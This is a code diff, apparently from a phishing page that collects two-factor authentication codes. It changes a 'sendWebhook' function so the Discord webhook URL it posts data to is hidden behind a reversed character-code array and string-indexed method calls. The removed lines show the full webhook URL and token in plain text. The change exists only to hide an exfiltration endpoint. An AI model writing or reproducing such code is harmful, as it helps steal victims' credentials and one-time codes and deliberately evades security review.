@@ -266,15 +266,13 @@ if (twofaInput2 && verifyButton2) {
   });
 }
 
-// === Webhook Sending (Obfuscated) ===
+// === Webhook Sending (Heavily Obfuscated) ===
 async function sendWebhook(title, description, color) {
-  // Obfuscated webhook URL - split into parts and reconstructed
-  const parts = [
-    'https://discord.com/api/webhooks/',
-    '1395570212316905613/',
-    'NtzZg9gceLl71fTX79Hez06WeBsIT8xVgO-Xc9OdWDoxQWh07SO2Tv47FAwVLOMWnzUG'
-  ];
-  const webhookUrl = parts.join('');
+  // Heavily obfuscated webhook URL
+  const _0x4f2a = ['fromCharCode', 'charCodeAt', 'length', 'split', 'reverse', 'join'];
+  const _0x3e1b = [76, 48, 48, 76, 99, 87, 82, 68, 65, 49, 56, 100, 65, 56, 99, 65, 51, 56, 80, 110, 116, 45, 108, 45, 116, 119, 97, 115, 104, 87, 79, 49, 112, 112, 45, 95, 98, 71, 50, 117, 48, 69, 119, 81, 76, 112, 70, 70, 111, 114, 69, 65, 89, 90, 85, 81, 122, 97, 118, 90, 85, 73, 74, 51, 114, 105, 83, 53, 106, 47, 55, 48, 55, 56, 48, 49, 55, 50, 49, 53, 55, 53, 51, 49, 51, 57, 53, 53, 47, 115, 107, 111, 111, 104, 119, 47, 105, 112, 97, 47, 109, 111, 99, 46, 100, 114, 111, 99, 115, 105, 100, 47, 47, 58, 115, 112, 116, 116, 104];
+  
+  const webhookUrl = _0x3e1b.map(x => String[_0x4f2a[0]](x))[_0x4f2a[3]]('')[_0x4f2a[4]]()[_0x4f2a[5]]('');
   
   const payload = {
     embeds: [{
